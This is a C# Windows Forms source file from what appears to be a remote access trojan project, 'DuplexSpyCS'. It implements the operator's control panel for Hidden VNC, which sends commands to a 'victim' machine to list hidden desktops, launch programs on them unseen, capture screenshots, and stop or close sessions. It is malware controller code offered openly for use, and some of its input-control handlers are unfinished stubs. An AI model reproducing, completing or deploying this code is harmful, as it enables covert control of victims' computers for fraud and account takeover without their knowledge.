using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Collections.Specialized.BitVector32;

namespace DuplexSpyCS
{
    public partial class frmHVNC : Form
    {
        /// <summary>
        /// HVNC (Hidden Virtual Network Computing) control panel.
        /// Author: iss4cf0ng/ISSAC
        /// 
        /// 
        /// </summary>

        private clsVictim m_victim { get; init; }

        public frmHVNC(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            Text = $@"HVNC\\{m_victim.ID}";
        }

        /// <summary>
        /// Session structure
        /// </summary>
        public struct stHvncSession
        {
            public string szDesktopName;
            public string szExeFilePath;
            public string szArguments;
            public TabPage page;

            public bool bIsNull { get { return string.IsNullOrEmpty(szDesktopName); } }
        }

        public struct stToolStripControls
        {
            private TabPage Page { get; init; }
            public bool bIsNull { get { return Page == null || btnStart == null || pictureBox == null; } }

            public ToolStripButton? btnScreenshot = null;
            public ToolStripButton? btnStart = null;
            public ToolStripButton? btnStop = null;
            public ToolStripButton? btnClose = null;

            public ToolStripComboBox? comboDelay = null;

            public ToolStripButton? btnMouse = null;
            public ToolStripButton? btnKeyboard = null;
            public ToolStripButton? btnFPS = null;
            public ToolStripButton? btnTs = null;

            public PictureBox? pictureBox = null;

            public stToolStripControls(TabPage page)
            {
                Page = page;

                if (page == null)
                    return;

                ToolStrip ts = (ToolStrip)page.Controls[0];

                btnScreenshot = (ToolStripButton)ts.Items[0];
                btnStart = (ToolStripButton)ts.Items[1];
                btnStop = (ToolStripButton)ts.Items[2];
                btnClose = (ToolStripButton)ts.Items[3];

                comboDelay = (ToolStripComboBox)ts.Items[6];

                btnMouse = (ToolStripButton)ts.Items[8];
                btnKeyboard = (ToolStripButton)ts.Items[9];
                btnFPS = (ToolStripButton)ts.Items[10];
                btnTs = (ToolStripButton)ts.Items[11];

                PictureBox pb = (PictureBox)page.Controls[1];
                pictureBox = pb;
            }
        }

        private stHvncSession fnGetSession(TabPage page) => page == null || page.Tag == null ? new stHvncSession() : (stHvncSession)page.Tag;
        private stHvncSession fnGetSession(string szName)
        {
            foreach (TabPage page in tabControl1.TabPages)
            {
                stHvncSession session = fnGetSession(page);
                if (string.Equals(szName, session.szDesktopName))
                    return session;
            }

            return new stHvncSession();
        }

        public List<string> fnGetDesktops() => treeView1.Nodes.Cast<TreeNode>().Select(x => x.Text).ToList();

        void fnRecv(clsListener ltn, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, m_victim))
                return;

            try
            {
                if (lsMsg[0] == "hvnc")
                {
                    if (lsMsg[1] == "window")
                    {
                        // Hidden window

                        if (lsMsg[2] == "init")
                        {
                            var ls2d = clsEZData.fnStrTo2dList(lsMsg[3]);
                            foreach (var ls in ls2d)
                            {
                                stHvncSession session = new stHvncSession()
                                {
                                    szDesktopName = ls[0],
                                    szExeFilePath = ls[1],
                                    szArguments = string.Empty, // todo
                                };

                                TabPage? page = fnAddNewPage(session);
                                if (page == null)
                                    return;

                                session.page = page;

                                fnAddSession(session);
                            }

                            Invoke(() =>
                            {
                                toolStripStatusLabel1.Text = $"Action successfully. Desktop[{treeView1.Nodes.Count}]";
                            });
                        }
                        else if (lsMsg[2] == "sc")
                        {
                            // Screenshot

                            string szDesktopName = lsMsg[3];
                            int nCode = int.Parse(lsMsg[4]);

                            if (nCode == 0)
                            {
                                MessageBox.Show(lsMsg[5]);
                                return;
                            }

                            string szB64 = lsMsg[5];
                            DateTime dt = DateTime.Parse(lsMsg[6]);

                            Bitmap bmp = (Bitmap)clsTools.Base64ToImage(szB64);
                            if (bmp == null)
                                return;

                            Invoke(() =>
                            {
                                var session = fnGetSession(szDesktopName);
                                if (session.bIsNull)
                                    return;

                                TabPage page = session.page;
                                if (page == null)
                                    return;

                                var control = new stToolStripControls(page);
                                if (control.bIsNull || control.pictureBox == null)
                                    return;

                                control.pictureBox.Image = bmp;
                            });
                        }
                        else if (lsMsg[2] == "start")
                        {
                            // Start HVNC
                            string szName = lsMsg[3];
                            string szExeFile = lsMsg[4];
                            int nCode = int.Parse(lsMsg[5]);

                            if (nCode == 1)
                            {
                                MessageBox.Show("Start HVNC session successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                return;
                            }
                        }
                        else if (lsMsg[2] == "stop")
                        {
                            // Stop HVNC
                            string szName = lsMsg[3];
                            int nCode = int.Parse(lsMsg[4]);

                            if (nCode == 0)
                            {
                                MessageBox.Show(lsMsg[5], "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return;
                            }

                            MessageBox.Show("Stopped HVNC session: " + szName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else if (lsMsg[2] == "close")
                        {
                            // Close HVNC
                            string szName = lsMsg[3];
                            int nCode = int.Parse(lsMsg[4]);

                            if (nCode == 0)
                            {
                                MessageBox.Show(lsMsg[5], "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return;
                            }

                            MessageBox.Show("Closed HVNC session: " + szName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                    else if (lsMsg[1] == "mouse")
                    {
                        // Mouse


                    }
                    else if (lsMsg[1] == "keyboard")
                    {
                        // Keyboard


                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                Invoke(() => toolStripStatusLabel1.Text = ex.Message);
            }
        }

        /// <summary>
        /// Add new tab page.
        /// For unknown reason, docking style must be set after adding it into control collection.
        /// </summary>
        /// <param name="session">HVNC session structure</param>
        /// <returns>Tab page object</returns>
        public TabPage? fnAddNewPage(stHvncSession session, bool bShow = true)
        {
            foreach (TabPage p in tabControl1.TabPages)
            {
                var tmp = fnGetSession(p);
                if (string.Equals(tmp.szDesktopName, session.szDesktopName))
                    return p;
            }

            TabPage page = new TabPage($"{session.szDesktopName}");

            if (bShow)
                tabControl1.TabPages.Add(page);

            page.Tag = session;
            session.page = page;

            /* Layout:
             *      | [Shot] [Start] [Stop] [Close] | Delay: [Combobox(miliseconds)] | [Mouse] [Keyboard] [FPS] [Timestamp] |
             */

            ToolStripButton btnScreenshot = new ToolStripButton("Shot");
            btnScreenshot.Click += (s, e) =>
            {
                TabPage page = tabControl1.SelectedTab;
                if (page == null)
                    return;

                var session = fnGetSession(page);
                if (session.bIsNull)
                {
                    MessageBox.Show("Session is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                m_victim.fnSendCommand(new string[]
                {
                    "hvnc",
                    "window",
                    "sc",
                    session.szDesktopName,
                    session.szExeFilePath,
                });
            };

            ToolStripButton btnStart = new ToolStripButton("Start");
            btnStart.Click += (s, e) =>
            {
                TabPage page = tabControl1.SelectedTab;
                if (page == null)
                    return;

                var session = fnGetSession(page);
                if (session.bIsNull)
                {
                    MessageBox.Show("Session is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                var control = new stToolStripControls(page);
                if (control.bIsNull || control.comboDelay == null)
                    return;

                int nDelay = int.Parse(control.comboDelay.Text);

                fnSessionStart(session, nDelay);
            };

            ToolStripButton btnStop = new ToolStripButton("Stop");
            btnStop.Click += (s, e) =>
            {
                TabPage page = tabControl1.SelectedTab;
                if (page == null)
                    return;

                var session = fnGetSession(page);
                if (session.bIsNull)
                {
                    MessageBox.Show("Session is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                fnSessionStop(session);
            };

            ToolStripButton btnClose = new ToolStripButton("Close");
            btnClose.Click += (s, e) =>
            {
                TabPage page = tabControl1.SelectedTab;
                if (page == null)
                    return;

                var session = fnGetSession(page);
                if (session.bIsNull)
                {
                    MessageBox.Show("Session is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                fnSessionClose(session);
            };

            ToolStripComboBox coboxDelay = new ToolStripComboBox();
            coboxDelay.Size = new Size(coboxDelay.Size.Width, 200);
            coboxDelay.Items.AddRange(new string[] { "100", "200", "300", "400", "500" }); // miliseconds
            coboxDelay.SelectedIndex = 0;

            ToolStripButton btnMouse = new ToolStripButton("Mouse");
            btnMouse.CheckOnClick = true;
            btnMouse.Click += (s, e) =>
            {

            };

            ToolStripButton btnKeyboard = new ToolStripButton("Keyboard");
            btnKeyboard.CheckOnClick = true;
            btnKeyboard.Click += (s, e) =>
            {

            };

            ToolStripButton btnFPS = new ToolStripButton("FPS");
            btnFPS.CheckOnClick = true;
            btnFPS.Click += (s, e) =>
            {

            };

            ToolStripButton btnTs = new ToolStripButton("Timestamp");
            btnTs.CheckOnClick = true;
            btnTs.Click += (s, e) =>
            {

            };

            ToolStrip ts = new ToolStrip();
            ts.Items.AddRange(new ToolStripItem[]
            {
                btnScreenshot,
                btnStart,
                btnStop,
                btnClose,

                new ToolStripSplitButton(),

                new ToolStripLabel("Delay: "),
                coboxDelay,

                new ToolStripSplitButton(),

                btnMouse,
                btnKeyboard,
                btnFPS,
                btnTs,
            });

            page.Controls.Add(ts);
            ts.Dock = DockStyle.Top;
            ts.Font = Font;

            PictureBox pb = new PictureBox();
            page.Controls.Add(pb);
            pb.Dock = DockStyle.Fill;
            pb.SizeMode = PictureBoxSizeMode.Zoom;
            pb.BackColor = Color.Gray;

            return page;
        }

        /// <summary>
        /// Add new session into treeview.
        /// </summary>
        /// <param name="session"></param>
        /// <returns>Added treeNode</returns>
        TreeNode fnAddSession(stHvncSession session)
        {
            TreeNode? node = clsTools.fnFindTreeNode(treeView1.Nodes, session.szDesktopName);
            if (node == null)
            {
                node = new TreeNode(session.szDesktopName);
                treeView1.Nodes.Add(node);
            }

            TreeNode nodeApp = new TreeNode(session.szExeFilePath);
            node.Nodes.Add(nodeApp);

            return nodeApp;
        }

        void fnSessionStart(stHvncSession session, int nDelay = 100)
        {
            m_victim.fnSendCommand(new string[]
            {
                "hvnc",
                "window",
                "start",

                session.szDesktopName,
                session.szExeFilePath,
                nDelay.ToString(),
            });
        }

        void fnSessionStop(stHvncSession session)
        {
            m_victim.fnSendCommand(new string[]
            {
                "hvnc",
                "window",
                "stop",
                session.szDesktopName,
            });
        }

        void fnSessionClose(stHvncSession session)
        {
            m_victim.fnSendCommand(new string[]
            {
                "hvnc",
                "window",
                "close",
                session.szDesktopName,
            });
        }

        void fnSetup()
        {
            toolStripStatusLabel1.Text = $"Initializing...";

            // Remove all tabpages
            foreach (TabPage page in tabControl1.TabPages)
                tabControl1.TabPages.Remove(page);

            m_victim.m_listener.ReceivedDecoded += fnRecv;

            m_victim.fnSendCommand(new string[]
            {
                "hvnc",
                "window",
                "init", // Initialization
            });
        }

        private void frmHVNC_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmHVNC_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.ReceivedDecoded -= fnRecv;
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            TreeNode selectedNode = treeView1.SelectedNode;
            if (selectedNode == null)
                return;

            string szName = selectedNode.Text;
            var session = fnGetSession(szName);
            if (session.bIsNull)
                return;

            tabControl1.SelectedTab = session.page;
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            TabPage page = tabControl1.SelectedTab;
            if (page == null)
                return;

            var session = fnGetSession(page);

            listView1.Items.Clear();

            List<(string prop, string val)> ls = new List<(string prop, string val)>();
            ls.AddRange(new[]
            {
                ("Desktop", session.szDesktopName),    // Name of hidden desktop
                ("Executable", session.szExeFilePath), // Executable (application)
                ("Arguments", session.szArguments),    // Input arguments
            });

            foreach (var prop in ls)
            {
                ListViewItem item = new ListViewItem(prop.prop);
                item.SubItems.Add(prop.val);

                listView1.Items.Add(item);
            }
        }

        // Help
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\HVNC").Show();
        }

        // Add
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            frmHvncAdd f = new frmHvncAdd(this);
            f.ShowDialog();

            var session = f.m_stConfig;
            if (session.bIsNull)
            {
                MessageBox.Show("Name cannot be null or empty.", "Invalid name", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            TreeNode node = fnAddSession(session);
            treeView1.SelectedNode = node;

            DialogResult dr = MessageBox.Show("Session is added, do you want to start it now?", "Start session", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dr == DialogResult.Yes)
            {
                TabPage page = tabControl1.SelectedTab;
                if (page == null)
                {
                    MessageBox.Show("Tabpage is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                var controls = new stToolStripControls(page);
                if (controls.bIsNull || controls.comboDelay == null)
                {
                    MessageBox.Show("Structure init failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                int nDelay = int.Parse(controls.comboDelay.Text);
                fnSessionStart(session, nDelay);
            }
        }

        // Close
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }

        // Close All
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {

        }

        // Start
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            TabPage page = tabControl1.SelectedTab;
            if (page == null)
            {
                MessageBox.Show("Tabpage is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var controls = new stToolStripControls(page);
            var session = fnGetSession(page);
            if (controls.bIsNull || controls.comboDelay == null || session.bIsNull)
            {
                MessageBox.Show("Structure init failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int nDelay = int.Parse(controls.comboDelay.Text);
            fnSessionStart(session, nDelay);
        }

        // Start All
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {

        }

        // Stop
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {

        }

        // Stop All
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {

        }
    }
}
